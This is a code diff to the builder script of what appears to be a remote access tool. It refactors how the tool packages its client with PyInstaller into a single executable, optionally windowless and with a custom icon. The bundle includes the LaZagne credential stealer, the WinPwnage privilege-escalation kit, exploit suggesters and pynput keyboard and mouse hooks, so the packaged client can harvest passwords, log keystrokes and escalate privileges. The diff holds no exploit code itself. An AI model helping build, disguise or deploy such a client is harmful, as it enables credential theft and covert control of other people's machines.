@@ -72,10 +72,16 @@ def get_external_ip():
 def get_pyinstaller():
     # if unix, pyinstaller should be available globally
     if platforms.OS in [platforms.DARWIN, platforms.LINUX]:
-        if shutil.which("pyinstaller") != "":
+        if shutil.which("pyinstaller") is not None and shutil.which("pyinstaller") != "":
             return "pyinstaller"
         else:
-            tkinter.messagebox.showerror("Error", "Pyinstaller not found in path")
+            # sometimes pyinstaller is in the local bin on linux
+            user_bin = f"{os.environ['HOME']}/.local/bin/pyinstaller"
+
+            if os.path.isfile(user_bin):
+                return "\"" + user_bin + "\""
+
+            tkinter.messagebox.showerror("Error", "Pyinstaller not found, add manually to path: https://stackoverflow.com/a/39646511")
     else:
         user_path = site.getusersitepackages().split("\\")[:-1]
         user_path = "\\".join(user_path)
@@ -113,7 +119,6 @@ def save_files(client_args):
 
 class Setup:
     def __init__(self):
-
         os.chdir(os.path.dirname(os.path.abspath(__file__)))  # ensure proper dir
 
         self.pyinstaller = get_pyinstaller()
@@ -253,60 +258,7 @@ class Setup:
 
             save_files(client_args)
 
-            windowed = "" if bool(self.is_console.get()) else "--windowed"
-            icon_command = f"--icon {self.icon_path}" if self.icon_path else ""
-            debug_command = "--debug=all --log-level DEBUG" if bool(self.is_debug.get()) else ""
-
-            # add to path for all submodules
-            paths = ""
-            for it in os.scandir(f"{os.path.dirname(os.path.abspath(__file__))}/submodule"):
-                if it.is_dir() and not it.path.endswith("__pycache__"):
-                    # don't add WinPwnage if not on windows
-                    if it.path.endswith("WinPwnage") and platforms.OS != platforms.WINDOWS:
-                        continue
-
-                    if it.path.endswith("LaZagne"):
-                        if platforms.OS == platforms.WINDOWS:
-                            paths += f"--path=\"{it.path}/Windows\" "
-                        elif platforms.OS == platforms.DARWIN:
-                            paths += f"--path=\"{it.path}/Mac\" "
-                        elif platforms.OS == platforms.LINUX:
-                            paths += f"--path=\"{it.path}/Linux\" "
-
-                        continue
-
-                    paths += f"--path=\"{it.path}\" "
-
-            hidden_imports = ""
-
-            lazagne_hidden = lazagne_get_modules_names() + [lazagne_mozilla_module_location,
-                                                            lazagne_chromium_based_module_location]
-            hidden_imports_list = [package_name for package_name, module_name in lazagne_hidden]
-            hidden_imports_list += ["pynput.keyboard._win32", "pynput.mouse._win32"]
-
-            for _import in hidden_imports_list:
-                hidden_imports += f"--hidden-import={_import} "
-
-            binary = ""
-            if platforms.OS == platforms.WINDOWS:
-                msvcp100dll = f"{os.environ['WINDIR']}/System32/msvcp100.dll"
-                msvcr100dll = f"{os.environ['WINDIR']}/System32/msvcr100.dll"
-
-                if os.path.exists(msvcp100dll) and os.path.exists(msvcr100dll):
-                    binary += f"--add-binary={msvcp100dll};msvcp100.dll --add-binary={msvcr100dll};msvcr100.dll"
-
-            command_arg = f"{self.pyinstaller} main_client.py {windowed} {icon_command} {debug_command} {paths} {binary} {hidden_imports}" \
-                          f"--onefile -y --clean --exclude-module FixTk --exclude-module tcl " \
-                          f"--exclude-module tk --exclude-module _tkinter --exclude-module tkinter --exclude-module Tkinter"
-
-            def run_command():
-                self.command = subprocess.Popen(command_arg, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE,
-                                                stdin=subprocess.PIPE)
-                log, log = self.command.communicate()
-                self.default_build_ui_state()
-                self.create_log_ui(log)
-
-            threading.Thread(target=run_command, daemon=False).start()
+            self.build()
 
     def add_icon_cb_callback(self):
         if self.icon.get() == 1:
@@ -344,6 +296,62 @@ class Setup:
             self.host_widg["text"] = self.local_ip
         elif value == "Loopback":
             self.host_widg["text"] = self.loopback_ip
+
+    def build(self):
+        windowed = "" if bool(self.is_console.get()) else "--windowed"
+        icon_command = f"--icon {self.icon_path}" if self.icon_path else ""
+        debug_command = "--debug=all --log-level DEBUG" if bool(self.is_debug.get()) else ""
+
+        # add to path for all python submodules
+        if platforms.OS == platforms.WINDOWS:
+            paths = f"--path=\"{helper.get_submodule_path('LaZagne/Windows')}\" " \
+                    f"--path=\"{helper.get_submodule_path('WinPwnage')}\" " \
+                    f"--path=\"{helper.get_submodule_path('wesng')}\""
+        elif platforms.OS == platforms.LINUX:
+            paths = f"--path=\"{helper.get_submodule_path('LaZagne/Linux')}\""
+        else:
+            paths = f"--path=\"{helper.get_submodule_path('LaZagne/Mac')}\""
+
+        hidden_imports = ""
+
+        # add lazagne imports (from lazagne setup)
+        lazagne_hidden = lazagne_get_modules_names() + [lazagne_mozilla_module_location,
+                                                        lazagne_chromium_based_module_location]
+        hidden_imports_list = [package_name for package_name, module_name in lazagne_hidden]
+
+        # add pynput hidden imports
+        hidden_imports_list += ["pynput.keyboard._win32", "pynput.mouse._win32"]
+
+        for _import in hidden_imports_list:
+            hidden_imports += f"--hidden-import={_import} "
+
+        # add binaries
+        binary = ""
+        if platforms.OS == platforms.WINDOWS:
+            msvcp100dll = f"{os.environ['WINDIR']}/System32/msvcp100.dll"
+            msvcr100dll = f"{os.environ['WINDIR']}/System32/msvcr100.dll"
+
+            if os.path.exists(msvcp100dll) and os.path.exists(msvcr100dll):
+                binary += f"--add-binary={msvcp100dll};msvcp100.dll --add-binary={msvcr100dll};msvcr100.dll"
+
+        elif platforms.OS == platforms.LINUX:
+            # add linux exploit suggester sh file
+            les_path = f"{helper.get_submodule_path('linux-exploit-suggester')}/linux-exploit-suggester.sh"
+            binary += f"--add-data=\"{les_path}:src/submodule/linux-exploit-suggester\""
+
+        command_arg = f"{self.pyinstaller} main_client.py {windowed} {icon_command} {debug_command} {paths} {binary} {hidden_imports}" \
+                      f"--onefile -y --clean --exclude-module FixTk --exclude-module tcl " \
+                      f"--exclude-module tk --exclude-module _tkinter --exclude-module tkinter --exclude-module " \
+                      f"Tkinter"
+
+        def run_pyinstaller():
+            self.command = subprocess.Popen(command_arg, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE,
+                                            stdin=subprocess.PIPE)
+            log, log = self.command.communicate()
+            self.default_build_ui_state()
+            self.create_log_ui(log)
+
+        threading.Thread(target=run_pyinstaller, daemon=False).start()
 
 
 if __name__ == "__main__":
